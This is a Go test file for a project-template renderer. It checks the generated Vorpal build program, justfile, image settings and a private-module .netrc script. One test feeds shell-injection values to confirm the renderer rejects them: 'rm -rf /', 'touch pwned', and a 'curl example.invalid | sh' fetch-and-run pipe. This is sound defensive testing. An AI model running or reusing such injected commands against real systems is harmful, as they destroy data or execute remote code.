package config

import (
	"go/ast"
	"go/format"
	"go/parser"
	"go/token"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"
)

// goServiceBotPrivateModules is the bot's GOPRIVATE list: the service kit and
// the two sibling repositories whose clients it imports with go get.
const goServiceBotPrivateModules = "github.com/ALT-F4-LLC/quirk-service-kit,github.com/ALT-F4-LLC/quirk-lambda-ai,github.com/ALT-F4-LLC/quirk-lambda-database"

// goServiceBotConfig describes quirk-backend-discord-bot: one service, an
// image pushed to quirk/backend-discord-bot, and private modules for the
// service kit and both client modules.
func goServiceBotConfig() GoServiceConfig {
	cfg := NewGoServiceConfig(Config{Name: "quirk-backend-discord-bot", Template: GoServiceName})
	cfg.PrivateModules = goServiceBotPrivateModules
	cfg.Image.Repository = "quirk/backend-discord-bot"
	return cfg
}

// goServiceRender renders cfg into a fresh working directory.
func goServiceRender(t *testing.T, cfg GoServiceConfig) {
	t.Helper()
	t.Chdir(t.TempDir())
	if err := cfg.Render(); err != nil {
		t.Fatalf("Render: %v", err)
	}
}

// A build-configs.yaml selecting go-service loads through New and
// GetTemplater, merges its parameters over the defaults, and renders every
// file.
func TestGoServiceGeneratesFromBuildConfigsYAML(t *testing.T) {
	t.Chdir(t.TempDir())
	yaml := `name: quirk-backend-discord-bot
template: go-service
parameters:
  privateModules: github.com/ALT-F4-LLC/quirk-service-kit,github.com/ALT-F4-LLC/quirk-lambda-ai
  image:
    repository: quirk/backend-discord-bot
`
	if err := os.WriteFile("build-configs.yaml", []byte(yaml), 0o600); err != nil {
		t.Fatalf("write config: %v", err)
	}
	cfg, err := New("build-configs.yaml")
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	tpl, err := cfg.GetTemplater()
	if err != nil {
		t.Fatalf("GetTemplater: %v", err)
	}
	svc, ok := tpl.(GoServiceConfig)
	if !ok {
		t.Fatalf("templater is %T, want GoServiceConfig", tpl)
	}
	if !slices.Equal(svc.Services, []string{"quirk-backend-discord-bot"}) {
		t.Errorf("services = %q, want the project name", svc.Services)
	}
	if svc.Image.Rootfs != goServiceDefaultRootfs {
		t.Errorf("image.rootfs = %q, want the default %q kept beside image.repository", svc.Image.Rootfs, goServiceDefaultRootfs)
	}
	if svc.PrivateModules != "github.com/ALT-F4-LLC/quirk-service-kit,github.com/ALT-F4-LLC/quirk-lambda-ai" {
		t.Errorf("privateModules = %q, want the build-configs.yaml list", svc.PrivateModules)
	}
	if err := tpl.Render(); err != nil {
		t.Fatalf("Render: %v", err)
	}
	for _, file := range []string{
		".editorconfig", ".envrc", ".github/renovate.json", ".github/vorpal-shell.sh",
		".github/workflows/ci.yaml", ".golangci.yaml", "Vorpal.toml", "cmd/vorpal/main.go", "justfile",
	} {
		if _, err := os.Stat(file); err != nil {
			t.Errorf("%s was not rendered: %v", file, err)
		}
	}
	info, err := os.Stat(vorpalShell)
	if err != nil {
		t.Fatalf("stat %s: %v", vorpalShell, err)
	}
	if got := info.Mode().Perm(); got != 0o755 {
		t.Errorf("%s mode = %#o, want %#o", vorpalShell, got, 0o755)
	}
}

// Render rejects a config whose names would break the generated shell,
// or collide as Vorpal artifacts.
func TestGoServiceRenderRejectsInvalidConfig(t *testing.T) {
	for _, tc := range []struct {
		name   string
		mutate func(*GoServiceConfig)
		want   string
	}{
		{"no services", func(c *GoServiceConfig) { c.Services = nil }, "services is empty"},
		{"service with quote", func(c *GoServiceConfig) { c.Services = []string{"bot'; rm -rf /"} }, "service"},
		{"uppercase service", func(c *GoServiceConfig) { c.Services = []string{"Bot"} }, "service"},
		{"service is dev environment", func(c *GoServiceConfig) { c.Services = []string{"demo-dev"} }, "unique"},
		{"artifact is a service", func(c *GoServiceConfig) { c.Artifacts = []string{"demo"} }, "unique"},
		{"image repository uppercase", func(c *GoServiceConfig) { c.Image.Repository = "Quirk/Bot" }, "image.repository"},
		{"image repository with host", func(c *GoServiceConfig) { c.Image.Repository = "registry:5000/bot" }, "image.repository"},
		{"image rootfs", func(c *GoServiceConfig) { c.Image.Repository = "quirk/bot"; c.Image.Rootfs = "" }, "image.rootfs"},
		{"image rootfs without version", func(c *GoServiceConfig) { c.Image.Repository = "quirk/bot"; c.Image.Rootfs = "linux-vorpal" }, "image.rootfs"},
		{"image rootfs with quote", func(c *GoServiceConfig) { c.Image.Repository = "quirk/bot"; c.Image.Rootfs = `a:1"` }, "image.rootfs"},
		{"image name collides", func(c *GoServiceConfig) {
			c.Image.Repository = "quirk/bot"
			c.Services = []string{"demo-image"}
		}, "unique"},
		{"generate newline", func(c *GoServiceConfig) { c.Generate = []string{"a\nb"} }, "newline"},
		{"name with quote", func(c *GoServiceConfig) {
			c.Name = "x'; touch pwned; echo '"
			c.Services = []string{"svc"}
		}, "name"},
		{"artifact with quote", func(c *GoServiceConfig) { c.Artifacts = []string{`x"; curl example.invalid | sh; echo "`} }, "artifact"},
		{"privateModules with quote", func(c *GoServiceConfig) { c.PrivateModules = `github.com/x",evil:"` }, "privateModules"},
		{"privateModules with space", func(c *GoServiceConfig) { c.PrivateModules = "github.com/x github.com/y" }, "privateModules"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Chdir(t.TempDir())
			cfg := NewGoServiceConfig(Config{Name: "demo", Template: GoServiceName})
			tc.mutate(&cfg)
			err := cfg.Render()
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("Render error = %v, want one containing %q", err, tc.want)
			}
			if _, statErr := os.Stat("justfile"); statErr == nil {
				t.Errorf("Render wrote files before rejecting the config")
			}
		})
	}
}

// goServiceProgramStrings parses the rendered cmd/vorpal/main.go and returns
// every string literal in it, unquoted.
func goServiceProgramStrings(t *testing.T) []string {
	t.Helper()
	src := goLambdaReadFile(t, "cmd/vorpal/main.go")
	file, err := parser.ParseFile(token.NewFileSet(), "main.go", src, 0)
	if err != nil {
		t.Fatalf("cmd/vorpal/main.go does not parse: %v\n%s", err, src)
	}
	var lits []string
	ast.Inspect(file, func(n ast.Node) bool {
		if lit, ok := n.(*ast.BasicLit); ok && lit.Kind == token.STRING {
			if s, err := strconv.Unquote(lit.Value); err == nil {
				lits = append(lits, s)
			}
		}
		return true
	})
	return lits
}

// The Vorpal program builds each service from cmd/<name> without cgo, passes
// the GOPRIVATE list to the build, excludes dist from the source, and builds
// the image from the rootfs alias on Linux only.
func TestGoServiceVorpalProgramBuildsServicesAndImage(t *testing.T) {
	goServiceRender(t, goServiceBotConfig())
	src := goLambdaReadFile(t, "cmd/vorpal/main.go")
	lits := goServiceProgramStrings(t)

	for _, want := range []string{
		"quirk-backend-discord-bot",
		"quirk-backend-discord-bot-dev",
		"quirk-backend-discord-bot-image",
		"linux-vorpal:latest",
		"-linux",
		"CGO_ENABLED=0",
		"-ldflags='-s -w'",
		"dist",
		"GOPRIVATE=" + goServiceBotPrivateModules,
	} {
		if !slices.Contains(lits, want) {
			t.Errorf("cmd/vorpal/main.go has no string literal %q", want)
		}
	}
	for _, want := range []string{
		"artifact.NewOciImage(",
		"strings.HasSuffix(ctx.GetTargetStr(), \"-linux\")",
		"credentialed = services",
	} {
		if !strings.Contains(src, want) {
			t.Errorf("cmd/vorpal/main.go does not contain %q", want)
		}
	}
	if strings.Contains(src, "lambda.norpc") {
		t.Errorf("cmd/vorpal/main.go builds a service with the lambda tag")
	}
	if strings.Contains(src, "NewArtifactArgument") {
		t.Errorf("cmd/vorpal/main.go reads a credential from a vorpal --variable; it must come from ~/.netrc")
	}
}

// Without an image or private modules, the program carries none of
// their code.
func TestGoServiceVorpalProgramOmitsUnusedFeatures(t *testing.T) {
	cfg := NewGoServiceConfig(Config{Name: "demo", Template: GoServiceName})
	cfg.PrivateModules = ""
	goServiceRender(t, cfg)
	src := goLambdaReadFile(t, "cmd/vorpal/main.go")
	goServiceProgramStrings(t)
	for _, absent := range []string{"NewOciImage", "privateModuleSandbox", "readNetrc", "GOPRIVATE", `"strings"`, `"os"`} {
		if strings.Contains(src, absent) {
			t.Errorf("cmd/vorpal/main.go contains %q without the feature that needs it", absent)
		}
	}
}

// The justfile packages the image into dist/ and pushes the tarball it wrote.
func TestGoServiceJustfileRecipes(t *testing.T) {
	goServiceRender(t, goServiceBotConfig())
	src := goLambdaReadFile(t, "justfile")
	for _, want := range []string{
		"OUTPUT=$(vorpal build --path 'quirk-backend-discord-bot-image')",
		`install -m 0644 "$OUTPUT/image.tar" 'dist/quirk-backend-discord-bot-image/image.tar'`,
		"push registry tag=`git rev-parse HEAD`:",
		"docker image load --input 'dist/quirk-backend-discord-bot-image/image.tar'",
		"docker image tag 'quirk-backend-discord-bot-image:latest' '{{ registry }}/quirk/backend-discord-bot:{{ tag }}'",
		"docker image push '{{ registry }}/quirk/backend-discord-bot:{{ tag }}'",
		"package-all:\n    just package \"quirk-backend-discord-bot\"\n",
	} {
		if !strings.Contains(src, want) {
			t.Errorf("justfile does not contain %q:\n%s", want, src)
		}
	}

	cfg := NewGoServiceConfig(Config{Name: "demo", Template: GoServiceName})
	goServiceRender(t, cfg)
	src = goLambdaReadFile(t, "justfile")
	for _, absent := range []string{"package-image:", "push ", "generate:"} {
		if strings.Contains(src, absent) {
			t.Errorf("default justfile contains %q", absent)
		}
	}
	if !strings.Contains(src, "check:\n") {
		t.Errorf("default check recipe has dependencies:\n%s", src)
	}

	// CI without privateModules runs only `just check`, so check must run
	// the generators.
	cfg.Generate = []string{"just gen"}
	goServiceRender(t, cfg)
	src = goLambdaReadFile(t, "justfile")
	for _, want := range []string{"check: generate\n", "generate:\n    #!/usr/bin/env bash\n    set -euxo pipefail\n    just gen\n"} {
		if !strings.Contains(src, want) {
			t.Errorf("justfile with generate does not contain %q:\n%s", want, src)
		}
	}
}

// The rendered Vorpal program is gofmt-clean for every combination of
// image, private modules, extension, script and includes.
func TestGoServiceVorpalProgramGofmtClean(t *testing.T) {
	for name, mutate := range map[string]func(*GoServiceConfig){
		"default":                func(*GoServiceConfig) {},
		"bot":                    func(c *GoServiceConfig) { *c = goServiceBotConfig() },
		"no private modules":     func(c *GoServiceConfig) { c.PrivateModules = "" },
		"bot no private modules": func(c *GoServiceConfig) { *c = goServiceBotConfig(); c.PrivateModules = "" },
		"image only":             func(c *GoServiceConfig) { c.Image.Repository = "quirk/x" },
		"no tools": func(c *GoServiceConfig) {
			c.Vorpal.ExcludeTools = []string{"golangci-lint", "govulncheck", "jq", "just", "gitleaks", "rumdl"}
		},
		"extension script includes": func(c *GoServiceConfig) {
			*c = goServiceBotConfig()
			c.Vorpal.Extension = "example.com/x/internal/vorpal"
			c.Vorpal.Script = "echo hi"
			c.Vorpal.Includes = []string{"cmd", "internal", "go.mod", "go.sum"}
		},
	} {
		t.Run(name, func(t *testing.T) {
			cfg := NewGoServiceConfig(Config{Name: "demo", Template: GoServiceName})
			mutate(&cfg)
			goServiceRender(t, cfg)
			src := goLambdaReadFile(t, "cmd/vorpal/main.go")
			formatted, err := format.Source([]byte(src))
			if err != nil {
				t.Fatalf("cmd/vorpal/main.go does not parse: %v\n%s", err, src)
			}
			if string(formatted) != src {
				t.Errorf("cmd/vorpal/main.go is not gofmt-clean:\n%s", src)
			}
		})
	}
}

// The private module script writes a 0600 .netrc from the secret files and
// leaves the shell's umask as it found it, so the service binary the build
// writes afterward keeps its usual mode.
func TestGoServicePrivateModuleScriptScopesUmask(t *testing.T) {
	goServiceRender(t, goServiceBotConfig())
	src := goLambdaReadFile(t, "cmd/vorpal/main.go")
	file, err := parser.ParseFile(token.NewFileSet(), "main.go", src, 0)
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	var script string
	ast.Inspect(file, func(n ast.Node) bool {
		assign, ok := n.(*ast.AssignStmt)
		if !ok || len(assign.Lhs) != 1 {
			return true
		}
		if sel, ok := assign.Lhs[0].(*ast.SelectorExpr); !ok || sel.Sel.Name != "script" {
			return true
		}
		ast.Inspect(assign.Rhs[0], func(n ast.Node) bool {
			if lit, ok := n.(*ast.BasicLit); ok && lit.Kind == token.STRING {
				s, err := strconv.Unquote(lit.Value)
				if err != nil {
					t.Fatalf("unquote %s: %v", lit.Value, err)
				}
				script += s
			}
			return true
		})
		return false
	})
	if !strings.Contains(script, "umask 077") {
		t.Fatalf("no private module script found:\n%s", src)
	}

	dir := t.TempDir()
	secrets := filepath.Join(dir, "secrets")
	workspace := filepath.Join(dir, "workspace")
	for _, d := range []string{secrets, workspace} {
		if err := os.Mkdir(d, 0o700); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(secrets, "NETRC_USERNAME"), []byte("app"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(secrets, "NETRC_PASSWORD"), []byte("tok"), 0o600); err != nil {
		t.Fatal(err)
	}
	cmd := exec.Command("bash", "-c", "set -euo pipefail\numask 022\n"+script+"\numask") //nolint:gosec // runs the script the test itself rendered
	cmd.Env = append(os.Environ(), "VORPAL_SECRET_DIR="+secrets, "VORPAL_WORKSPACE="+workspace)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("script failed: %v\n%s", err, out)
	}
	if got := strings.TrimSpace(string(out)); got != "0022" {
		t.Errorf("umask after the script = %q, want 0022", got)
	}
	netrc := filepath.Join(workspace, ".netrc")
	info, err := os.Stat(netrc)
	if err != nil {
		t.Fatalf("stat .netrc: %v", err)
	}
	if got := info.Mode().Perm(); got != 0o600 {
		t.Errorf(".netrc mode = %#o, want 0600", got)
	}
	content, err := os.ReadFile(netrc) //nolint:gosec // reads the file the test's script wrote
	if err != nil {
		t.Fatal(err)
	}
	if want := "machine github.com login app password tok\n"; string(content) != want {
		t.Errorf(".netrc = %q, want %q", content, want)
	}

	// A missing secret file, or a .netrc the script cannot write, fails the
	// script; errexit is off inside the subshell, so each command carries its
	// own exit.
	for name, prepare := range map[string]func(t *testing.T){
		"missing password": func(t *testing.T) {
			if err := os.Remove(filepath.Join(secrets, "NETRC_PASSWORD")); err != nil {
				t.Fatal(err)
			}
		},
		"unwritable netrc": func(t *testing.T) {
			if err := os.Mkdir(netrc, 0o700); err != nil {
				t.Fatal(err)
			}
		},
	} {
		t.Run(name, func(t *testing.T) {
			if err := os.RemoveAll(netrc); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(secrets, "NETRC_PASSWORD"), []byte("tok"), 0o600); err != nil {
				t.Fatal(err)
			}
			prepare(t)
			cmd := exec.Command("bash", "-c", "set -euo pipefail\n"+script+"\necho reached") //nolint:gosec // runs the script the test itself rendered
			cmd.Env = append(os.Environ(), "VORPAL_SECRET_DIR="+secrets, "VORPAL_WORKSPACE="+workspace)
			out, err := cmd.CombinedOutput()
			if err == nil || strings.Contains(string(out), "reached") {
				t.Errorf("script succeeded, want failure:\n%s", out)
			}
		})
	}
}
